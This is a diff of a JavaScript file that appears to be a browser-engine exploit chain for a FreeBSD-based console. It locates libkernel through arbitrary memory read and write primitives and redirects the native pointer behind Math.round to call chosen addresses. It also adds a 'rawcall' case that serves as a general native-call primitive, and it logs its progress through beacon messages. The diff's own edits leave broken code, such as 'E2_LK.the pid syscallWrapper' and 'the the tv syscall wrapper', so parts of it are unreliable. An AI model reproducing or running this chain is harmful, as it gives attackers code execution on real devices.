@@ -5103,8 +5103,8 @@ function _startWsShell(){
          * analysis time) never fit inside the fuse. This runs the WHOLE
          * campaign in-page: harvest -> match vs window.E2_RVAS (the 13.60
          * the lk target table, layout-stable on 14.10) -> verifier ladder
-         * (lk+0x1200 sceKernelGetCurrentCpu -> 0..7) -> E2 (lk+0x1B860
-         * getpid wrapper -> the pid). Every stage beacons so a mid-ladder
+         * (lk+0x1200 the cpu probe -> 0..7) -> E2 (lk+0x1B860
+         * the pid syscall wrapper -> the pid). Every stage beacons so a mid-ladder
          * death leaves the full trail in shell-beacons.log.
          * msg.skip: comma-separated failed bases to exclude (hex). */
         if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
@@ -5229,7 +5229,7 @@ function _startWsShell(){
         ELs('preflight0 -> '+String(Math.round(-5.7)));
         var origRoundFn=S.absRead(S.neEntry.addr+0x28n,8)[0];
         ELs('preflight1 -> '+e2call(origRoundFn));
-        /* v4: THE DECODE-IMMUNE WITNESS - gettimeofday. Sessions 14/15/16 all:
+        /* v4: THE DECODE-IMMUNE WITNESS - the tv syscall. Sessions 14/15/16 all:
          * preflights -6/-6 then death at the first foreign call. Root cause
          * (complete): raw syscall wrappers pass the kernel's RAX through and
          * FreeBSD-family kernels return POSITIVE errnos - open("") -> RAX=2
@@ -5238,7 +5238,7 @@ function _startWsShell(){
          * encoding and crashed the engine at first touch - WITH THE BASES
          * LIKELY RIGHT ALL THREE TIMES.
          * THE FIX: eliminate decoding entirely. RDI = fakeScope = the tv
-         * buffer (its first 0x38 bytes are ours); the gettimeofday wrapper
+         * buffer (its first 0x38 bytes are ours); the the tv syscall wrapper
          * WRITES the unix wall clock there; the call's raw return is
          * DISCARDED UNTOUCHED (an unbound expression statement - the JSValue
          * never materializes, no deref, no crash) and the effect is read
@@ -5292,7 +5292,7 @@ function _startWsShell(){
         if(lkBase===null){reply.log=elog;reply.err='no candidate confirmed';break;}
         /* ---- stage 5 (v8): THE DRIFT VOTE ----
          * Sessions 25/26: canary CONFIRMED the base twice; the uncorrected
-         * gettimeofday call at lk+0x1B840 (the 13.60 RVA) crashed both
+         * the tv syscall call at lk+0x1B840 (the 13.60 RVA) crashed both
          * times - the TEXT drifted 13.60->14.10 (the data did NOT: the
          * canary at +0x751D0 exact twice). The pthread pair-delta
          * fingerprint found no pairs (the WK module imports single family
@@ -5337,9 +5337,9 @@ function _startWsShell(){
         }
         /* ---- stage 4: garnish - the pid (post-witness; if the pid decodes
          * badly the CONFIRMED beacon has already landed on sync channels) ---- */
-        ELs('lk_base=0x'+lkBase.toString(16)+' CONFIRMED (gettimeofday wrote the wall clock)');
-        var pid=e2call(lkBase+BigInt(E2_LK.getpidWrapper));
-        ELs('getpid -> '+pid);
+        ELs('lk_base=0x'+lkBase.toString(16)+' CONFIRMED (the tv syscall wrote the wall clock)');
+        var pid=e2call(lkBase+BigInt(E2_LK.the pid syscallWrapper));
+        ELs('the pid syscall -> '+pid);
         var pidN=Number(pid);
         if(isFinite(pidN)&&pidN>0){reply.pidraw=pidN*2+1;}
         reply.lkbase='0x'+lkBase.toString(16);
@@ -5348,6 +5348,33 @@ function _startWsShell(){
         reply.cands=clist.slice(0,8).map(function(c){return {base:'0x'+c.B.toString(16),anchors:c.anchors,names:c.names};});
         reply.log=elog;
         try{bs('E2SHOT-COMPLETE lk=0x'+lkBase.toString(16)+' tv='+(reply.tv||'?')+' pid='+pid+' pidraw='+(reply.pidraw||'?'));}catch(e){}
+        break;
+      }
+
+      case 'rawcall':{
+        /* THE DECODE-IMMUNE CALL PRIMITIVE (session 41): redirect, call,
+         * DISCARD THE RETURN UNTOUCHED (an unbound expression statement -
+         * raw kernel returns like positive errnos are invalid JSValue
+         * encodings that crash the engine at first touch; an unbound
+         * result never materializes), restore, and report the fake
+         * scope's first 0x20 bytes - the MEMORY SIDE-CHANNEL. Wrappers
+         * that WRITE to [RDI] (the time class) leave their signature
+         * there; the caller compares against the pre-zeroed scope.
+         * msg.addr: the exact target (a TRUE function entry - imported
+         * wrappers, never mid-instruction guesses). */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        var target=BigInt(msg.addr);
+        for(var zr=0;zr<4;zr++)S.absWrite(S.fakeScope+BigInt(zr*8),0n);
+        if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+        var origFnR=S.absRead(S.neEntry.addr+0x28n,8)[0];
+        S.absWrite(S.neEntry.addr+0x28n,target);
+        try{Math.round(-5.7);}catch(e){}
+        S.absWrite(S.neEntry.addr+0x28n,origFnR);
+        if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+        var vfyR=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origFnR);
+        var sc0=S.absRead(S.fakeScope,8)[0],sc1=S.absRead(S.fakeScope+8n,8)[0],sc2=S.absRead(S.fakeScope+16n,8)[0],sc3=S.absRead(S.fakeScope+24n,8)[0];
+        reply.verified=vfyR;
+        reply.scope=['0x'+sc0.toString(16),'0x'+sc1.toString(16),'0x'+sc2.toString(16),'0x'+sc3.toString(16)];
         break;
       }
 
